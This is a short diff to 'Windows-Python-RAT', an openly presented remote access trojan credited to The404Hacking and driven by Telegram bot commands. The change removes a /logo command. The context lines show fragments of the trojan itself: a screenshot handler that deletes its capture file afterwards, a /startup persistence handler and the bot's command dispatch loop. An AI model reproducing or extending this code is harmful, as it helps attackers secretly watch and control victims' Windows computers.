@@ -91,8 +91,6 @@ Other Commands:
 [ /] /time
 [12] Windows-Python-RAT GitHub.
 [ /] /github
-[13] Windows-Python-RAT Logo.
-[ /] /logo
 
 @The404Hacking
 Digital Security ReSearch Group
@@ -276,14 +274,6 @@ def screenshot_method(bot , update):
 	photo.close()
 	os.system("del C:\Windows\ScreenShot.png")
 
-# /logo
-def logo_method(bot , update):
-	chat_id = update.message.chat_id
-	bot.sendMessage(chat_id , "Please Wait ...")
-	chat_id = update.message.chat_id
-	photo = open("Windows-Python-RAT.jpg" , "rb")
-	bot.sendPhoto(chat_id,photo,"Windows-Python-RAT Logo !\n\nHelp: /help\n@The404Hacking")
-
 # /startup
 def startup_method(bot , update):
 	chat_id = update.message.chat_id
@@ -349,9 +339,6 @@ update.dispatcher.add_handler(contact)
 
 github = CommandHandler("github", github_method)
 update.dispatcher.add_handler(github)
-
-logo = CommandHandler("logo" , logo_method)
-update.dispatcher.add_handler(logo)
 
 update.start_polling()
 # ------------------------------------------------------------------------
